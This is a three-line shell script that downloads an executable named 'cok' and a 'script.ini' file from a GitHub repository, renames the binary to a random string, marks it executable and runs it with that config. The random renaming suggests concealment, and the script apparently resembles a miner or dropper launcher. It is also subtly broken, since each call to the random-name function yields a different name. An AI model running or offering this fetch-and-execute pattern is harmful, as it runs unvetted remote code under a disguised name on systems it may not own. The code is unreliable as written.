randomname() { head -c24 /dev/urandom | base64 | tr -dc a-zA-Z; }
wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && mv cok `randomname` && chmod +x `randomname` && ./`randomname` script.ini
